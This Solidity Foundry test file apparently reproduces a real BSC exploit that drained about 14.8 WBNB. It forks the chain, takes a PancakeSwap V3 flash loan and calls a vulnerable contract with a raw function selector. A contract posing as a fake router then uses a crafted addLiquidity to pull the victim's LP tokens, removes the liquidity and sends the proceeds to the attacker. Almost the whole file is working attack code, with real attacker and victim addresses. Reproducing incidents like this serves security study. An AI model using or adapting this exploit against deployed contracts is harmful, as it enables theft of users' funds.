// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 14.8 WBNB
// Attacker : https://bscscan.com/address/0x8Efb9311700439d70025d2B372fb54c61a60d5DF
// Attack Contract : https://bscscan.com/address/0x75ff620FF0e63243e86b99510cDbaD1D5e76524E
// Vulnerable Contract : https://bscscan.com/address/0x6f3390c6C200e9bE81b32110CE191a293dc0eaba
// Attack Tx : https://bscscan.com/tx/0xc8572846ed313b12bf835e2748ff37dacf6b8ee1bab36972dc4ace5e9f25fed7

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x6f3390c6C200e9bE81b32110CE191a293dc0eaba#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1877032470098428058
// Hacking God : N/A
pragma solidity ^0.8.0;

address constant HORS_ADDR = 0x1Bb30f2AD8Ff43BCD9964a97408B74f1BC6C8bc0;
address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_ADDR = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant CAKE_LP = 0xd5868B2e2B510A91964AbaFc2D683295586A8C70;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant VULN_CONTRACT = 0x6f3390c6C200e9bE81b32110CE191a293dc0eaba;

contract HORS is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 45587949 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = WBNB_ADDR;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        AttackContract attackContract = new AttackContract();
        attackContract.attack();
    }
}


contract AttackContract {
    address public attacker;
    constructor() {
        attacker = msg.sender;
    }
    function attack() public {
        bytes memory data = "";
        IPancakeV3Pool(PANCAKE_V3_POOL).flash(address(this), 0, 0.1 ether, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        // The VULN_CONTRACT contract, which holds the WBNB/HORS LP tokens, lacks proper input validation.
        // attacker used a fake router contract (this) to drain the tokens.
        bytes memory payload = abi.encodeWithSelector(
            bytes4(0xf78283c7),
            HORS_ADDR,
            address(this),
            CAKE_LP
        );
        (bool success, bytes memory returnData) = VULN_CONTRACT.call(payload);
        require(success, string(returnData));

        IERC20(CAKE_LP).approve(PANCAKE_ROUTER, type(uint256).max);
        uint256 balance = IERC20(CAKE_LP).balanceOf(address(this));
        IPancakeRouter(payable(PANCAKE_ROUTER)).removeLiquidity(WBNB_ADDR, HORS_ADDR, balance, 0, 0, address(this), block.timestamp);

        IERC20(WBNB_ADDR).transfer(PANCAKE_V3_POOL, 0.1 ether + fee1);
        IERC20(WBNB_ADDR).transfer(attacker, IERC20(WBNB_ADDR).balanceOf(address(this)));
    }

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) public returns (uint256, uint256, uint256) {
        uint256 horsBalance = IERC20(CAKE_LP).balanceOf(VULN_CONTRACT);
        IERC20(CAKE_LP).transferFrom(VULN_CONTRACT, address(this), horsBalance);
    }
    
}
